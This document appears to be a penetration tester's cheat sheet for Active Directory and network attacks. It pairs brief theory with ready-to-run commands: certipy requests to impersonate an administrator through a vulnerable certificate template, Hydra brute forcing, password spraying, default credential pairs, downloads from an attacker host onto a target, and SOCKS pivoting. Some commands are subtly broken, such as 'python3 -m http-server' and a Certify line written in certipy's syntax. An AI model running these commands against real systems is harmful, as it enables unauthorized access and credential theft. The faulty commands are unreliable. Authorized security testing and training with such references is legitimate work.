## Overview
Network testing is all about finding the services that are communicating over the network and exploiting them to gain initial access or escalate privileges. Identify services that might be sending authentications in plaintext or services that allow unauthenticated access. It is also very common to find internal web applications with no protections in place that might allow for unauthenticated access to things like file shares. 
## Theory
**SMB Null Sessions** - Misconfigured SMB servers might allow users to authenticate to SMB without a username or password or with the guest account and no password. This could allow you to read all of the files in SYSVOL or other file shares present on individual systems.
**LLMNR/NBT-NS Poisoning** - On most networks, it is possible to send responses to LLMNR and NBT-NS requests and impersonate a legitimate service to capture hashes. 
**WPAD/mDNS Spoofing** - On most networks, it is possible to spoof responses to mDNS and WPAD requests to man-in-the-middle traffic between the requesting device and the intended destination. 
**IPv6 Attacks** - By default, Windows devices attempt to use IPv6 to find domain controllers which allows attackers to respond to devices attempting to locate a domain controller and collect hashes. 
**NTLM Relay/Pass-The-Hash** - With captured NTLM hashes, it is sometimes possible to relay or pass those credentials to authenticate to another system without having to crack the NTLM hash. 
**ADCS Attacks** - Misconfigured certificate templates can allow a low-privilege user to request a certificate that will allow them to authenticate as a user with a higher level of privilege. 
## Tools/Commands
### SMB Testing
Get accessible shares from list of hosts
- `crackmapexec smb scope.txt -u $user -p $password --shares
Map readable files
- `smbmap -H $rhost -u $user -p $password -R --depth 3 --exclude IPC$`
- `crackmapexec smb $rhost -u $user -p $password -M spider_plus`
### Active Directory
https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
https://zer1t0.gitlab.io/posts/attacking_ad/
- [ ] NTLM Relay
- [ ] IPv6 (MITM6)
#### ADCS Abuse
Windows enumerate vulnerable certificates
- `certify.exe find domain.local/user:pass@domain.local -vulnerable`
Linux enumerate vulnerable certificates
- `certipy-ad find -u 'user' -p 'pass' -dc-ip '127.0.0.1' -vulnerable -stdout`
Request vulnerable certificate for admin
- `certipy-ad req -u 'user' -p 'pass' -dc-ip '127.0.0.1' -ca 'DOMAIN-CA' -target 'dc.local' -template 'VULN-TEMPLATE' -upn 'administrator@domain.local' -ns '127.0.0.1'`
#### GetNPUsers
#### GetUserSPNs

### Linux
Check for `sudo no password` commands
- `sudo -l`
- [GTFOBins](https://gtfobins.github.io)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
Find files created by a user
- `find / -user $USER ! -path "*proc*" ! -path "*var*" ! -path "*dev*" 2>/dev/null`
- [ ] `sudo` version
- [ ] `ssh` version
- [ ] Kernel Exploits
## Password Attacks
### Testing Logins & MFA
#### Default Credentials
[CIRT Default Credential Lookup](https://cirt.net/passwords)
- `Admin:CompanyName`
- `Admin:Hostname`
- `root:toor`
- `Admin:Password`
- `Admin:Admin`
#### MFA Testing
https://www.blackhillsinfosec.com/exploiting-mfa-inconsistencies-on-microsoft-services/
#### Hydra
`hydra 127.0.0.1 ssh -l $user -P /wordlist.txt -s 22 -vV`
### Password Spraying
#### CrackMapExec
- `crackmapexec smb scope.txt -u users.txt -p passwords.txt`
#### Go365
- `go365 -endpoint rst -ul users.txt -pl passwords.txt -d domain.com -w 5 -delay 1600 -o go365_domain.txt`
#### WPScan
- `wpscan --url http://example.com -e u --passwords /usr/share/wordlists/pass.txt`
## Useful Tricks
### File Transfers
Simple HTTP server
- `python3 -m http-server`
- `curl http://$lhost:8000/file.sh > file.sh`
- `iwr -URI http://$lhost:8000/file.ps1 -UseBasicParsing > file.ps1`
SCP
- `scp user@host1.local:/file/to/send user@host2.local:/where/to/place`
### SSH Tunneling & Port Forwarding
SSH forward remote port 8000 to localhost:1234
- `ssh -L 1234:localhost:8000 user@$rhost`
SSH Dynamic SOCKS Proxy
- `ssh -D 9001 user@203.0.113.10`
Add SOCKS proxy
- `socks4 203.0.113.10 9001`
Use SOCKS proxy to run a command: 
- `proxychains4 crackmapexec smb $target --shares`